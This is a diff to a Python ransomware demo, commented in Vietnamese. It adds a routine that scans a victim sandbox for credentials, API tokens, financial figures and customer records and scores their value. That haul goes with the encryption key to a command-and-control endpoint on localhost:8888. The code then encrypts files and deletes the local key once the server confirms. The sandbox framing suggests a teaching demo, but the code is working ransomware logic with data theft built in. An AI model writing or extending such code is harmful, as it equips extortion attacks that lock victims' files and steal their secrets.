@@ -7,15 +7,19 @@ import base64
 import tkinter as tk
 from tkinter import ttk
 import urllib.request, socket, json          # ← bỏ dòng import trùng bên dưới
+import re
 
-def _report_to_c2(key: bytes, files_encrypted: int) -> bool:
+def _report_to_c2(key: bytes, files_encrypted: int,
+                  analysis: dict = None) -> bool:
     victim_id = socket.gethostname() + '_' + str(os.getpid())
     payload   = json.dumps({
         'victim_id': victim_id,
         'hostname':  socket.gethostname(),
         'key':       key.hex(),
         'files':     files_encrypted,
+        'analysis':  analysis or {},    # ← thêm
     }).encode()
+
     try:
         req = urllib.request.Request(
             'http://localhost:8888/register',
@@ -68,6 +72,76 @@ def _ensure_sandbox() -> None:
             fh.write(content)
 
 
+def _analyze_data(sandbox_dir: str) -> dict:
+    report = {
+        'files_found':     0,
+        'total_size_kb':   0,
+        'sensitive':       [],
+        'credentials':     [],
+        'financial':       [],
+        'customer_count':  0,
+        'estimated_value': '',
+    }
+
+    CRED_PATTERNS = [
+        (r'api[_-]?key\s*[:=]\s*\S+',   'API Key'),
+        (r'password\s*[:=]\s*\S+',       'Password'),
+        (r'db[_-]?pass\s*[:=]\s*\S+',   'DB Password'),
+        (r'secret[_-]?key\s*[:=]\s*\S+','Secret Key'),
+        (r'sk-[a-zA-Z0-9\-]+',          'API Token'),
+    ]
+    MONEY_PATTERNS = [
+        r'\$[\d,]+\.?\d*',
+        r'[\d,]+\s*VND',
+        r'(?i)revenue.*?[\d,]+',
+        r'(?i)budget.*?[\d,]+',
+    ]
+
+    for root, _, files in os.walk(sandbox_dir):
+        for filename in files:
+            if filename.startswith('.'):
+                continue
+            filepath = os.path.join(sandbox_dir, filename)
+            try:
+                size_kb = os.path.getsize(filepath) / 1024
+                report['files_found']   += 1
+                report['total_size_kb'] += round(size_kb, 2)
+
+                with open(filepath, 'r', errors='ignore') as fh:
+                    content = fh.read()
+
+                for pattern, label in CRED_PATTERNS:
+                    matches = re.findall(pattern, content, re.IGNORECASE)
+                    for m in matches:
+                        report['credentials'].append({
+                            'file':  filename,
+                            'type':  label,
+                            'value': m[:50],
+                        })
+                    if matches and filename not in report['sensitive']:
+                        report['sensitive'].append(filename)
+
+                for pattern in MONEY_PATTERNS:
+                    matches = re.findall(pattern, content, re.IGNORECASE)
+                    report['financial'].extend(matches[:2])
+
+                if filename.endswith('.csv') and 'customer' in filename:
+                    lines = content.strip().split('\n')
+                    report['customer_count'] += max(0, len(lines) - 1)
+
+            except Exception:
+                pass
+
+    cred_count = len(report['credentials'])
+    if cred_count >= 3:
+        report['estimated_value'] = 'HIGH — Multiple credentials found'
+    elif cred_count >= 1:
+        report['estimated_value'] = 'MEDIUM — Credentials found'
+    else:
+        report['estimated_value'] = 'LOW — No credentials'
+
+    return report
+
 def _reset_sandbox() -> None:
     """Khôi phục shop_data về trạng thái ban đầu để chạy lại demo."""
     if not os.path.exists(VICTIM_SANDBOX):
@@ -87,10 +161,17 @@ def _reset_sandbox() -> None:
 def trigger_encryption(sandbox_dir: str) -> None:
     _reset_sandbox()       # ← reset trước để demo lại được nhiều lần
     _ensure_sandbox()
+    
+    # ← THÊM PHẦN NÀY
+    analysis = _analyze_data(sandbox_dir)
+    print(f"[*] Analysis: {analysis['files_found']} files | "
+          f"{len(analysis['credentials'])} credentials | "
+          f"{analysis['estimated_value']}")
 
+    #sinh key
     import secrets
     session_key = secrets.token_bytes(32)
-
+    # ghi key vào file .ransom_key
     key_file = os.path.join(sandbox_dir, ".ransom_key")
     with open(key_file, "wb") as fh:
         fh.write(session_key)
@@ -122,7 +203,7 @@ def trigger_encryption(sandbox_dir: str) -> None:
             os.replace(filepath, filepath + DEMO_ORIGINAL_EXT)
             count += 1
 
-    success = _report_to_c2(session_key, count)
+    success = _report_to_c2(session_key, count, analysis)
 
     if success:
         os.remove(key_file)
